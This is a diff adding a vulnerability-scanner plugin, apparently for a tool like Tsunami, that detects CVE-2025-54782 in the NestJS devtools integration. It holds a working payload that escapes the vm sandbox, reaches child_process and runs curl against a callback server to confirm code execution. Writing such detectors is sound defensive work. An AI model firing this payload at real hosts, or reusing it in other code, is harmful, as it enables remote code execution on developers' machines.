@@ -1,0 +1,95 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "NestJsDevTools_CVE_2025_54782"
+  author: "frkngksl"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2025-54782"
+  }
+  severity: CRITICAL
+  title: "Remote Code Execution in @nestjs/devtools-integration (CVE-2025-54782)"
+  description: "The @nestjs/devtools-integration package for NestJS in versions 0.2.0 and below exposes a local development HTTP server that uses an unsafe JavaScript sandbox implementation via Node.js's vm.runInNewContext. Due to missing cross-origin (CORS) protections and improper sandboxing, an attacker can coerce a developer into visiting a malicious website, which can then perform cross-origin requests to execute arbitrary code on the developer's local machine via the /inspector/graph/interact endpoint."
+  recommendation: "Update the @nestjs/devtools-integration dependency to version 0.2.1 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2025-54782"
+  }
+}
+
+config: {debug: true}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_nestjs_devtools"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      expect_all: {
+        conditions: [
+          # NestJS devtools graph server typically exposes a localized response or identifier on the root path
+          { body: {} contains: "Nest" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "trigger_code_execution"
+  http_request: {
+    method: POST
+    uri: "/inspector/graph/interact"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    # Sends a sandboxed evaluation payload utilizing an out-of-band request to confirm execution
+    data: "{\"code\": \"this.constructor.constructor('return process')().mainModule.require('child_process').exec('curl {{ T_CBS_URI }}')\"}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"status\":" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_nestjs_devtools",
+    "trigger_code_execution",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
